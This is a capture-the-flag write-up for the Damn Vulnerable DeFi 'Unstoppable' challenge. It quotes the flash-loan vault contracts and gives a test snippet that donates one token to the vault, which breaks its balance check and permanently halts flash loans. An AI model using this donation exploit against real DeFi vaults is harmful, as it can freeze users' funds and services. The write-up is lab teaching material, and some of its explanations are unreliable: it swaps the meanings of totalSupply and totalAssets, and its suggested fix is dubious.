## What is our mission
There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To pass the challenge, we will make the vault stop offering flash loans...

<br/>

## What are the smart contracts 
- **`UnstoppableVault.sol`**: smart contract that includes **`flashLoan(...)`** function 
- **`ReceiverUnstoppable.sol`**: receiver smart contract that includes **`onFlashLoan(...)`** function 
- **`DamnValuableToken.sol`**: just an ERC20 Token

<br/>


## Solution 

**1.** **`UnstoppableVault.sol`** contract's **`onFlashLoan(...)`** function

``` solidity
// ReceiverUnstoppable.sol

function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)
            revert UnexpectedFlashLoan();

        ERC20(token).approve(address(pool), amount);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }
```

**2.** **`UnstoppableVault.sol`** contract's the **`flashloan(...)`** function

``` solidity
// UnstoppableVault.sol

function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) 
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement

        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
        
        uint256 fee = flashFee(_token, amount);

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        
        return true;
    }
```

**3.** The vulnarability cames from, **`UnstoppableVault.sol`** contract's the **`flashloan(...)`** function. 

``` solidity
// UnstoppableVault.sol

function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) 
    {
        //...

        /////////////////////////////////////////////////////////
        ///////////THIS IS WHERE THE PROBLEM CAMES FROM//////////
        /////////////////////////////////////////////////////////
        uint256 balanceBefore = totalAssets();        
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

        //.... 
    }       
```

If **`convertToShares(totalSupply)`** is not equal to **`balanceBefore`** transecton will fail with **`revert InvalidBalance()`**

<br/>

**`totalSupply`** ==> total amount of **asset('DVT')**.

**`totalAssets()`** ==> returns the amount of **shares('DVTo')** inside the contract.

**`convertToShares()`** ==> returns the amount of **shares('DVTo')** that would be exchanged by the vault for the amount of **asset('DVT')** provided.

To stop the pool from offering flash loans, we just have to change one of these variables. After that the **"UnstoppableVault contract"** will be always fail to land falshloans, because the calculation will always fail.

So, we will send some amount of DVT tokens to **`UnstoppableVault.sol`** contract. This will change **`totalSupply`** value, and this will cause **`convertToShares(totalSupply)`** value to change. And **`convertToShares(totalSupply)`** wont be equal to **`balanceBefore`**

``` js
// test/unstoppable/unstoppable.challenge.js

it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
               
        let amount = ethers.utils.parseEther('1');
        await token.transfer(vault.address, amount);
    });
```

<br/>


## How could this exploit be prevented ?
I think instead of using **`convertToShares(totalSupply) != balanceBefore`**,  

**`convertToShares(totalSupply) >= balanceBefore`** should be used.



<br/>


## How to test it
got to ➡️ [**Damn Vulnerable Defi - Chalange #1**](https://www.damnvulnerabledefi.xyz/challenges/1.html). Clone the repository as mentioned and put [**solution code**](Solution.txt) to his place.

Then you can just type **`npm run unstoppable`**
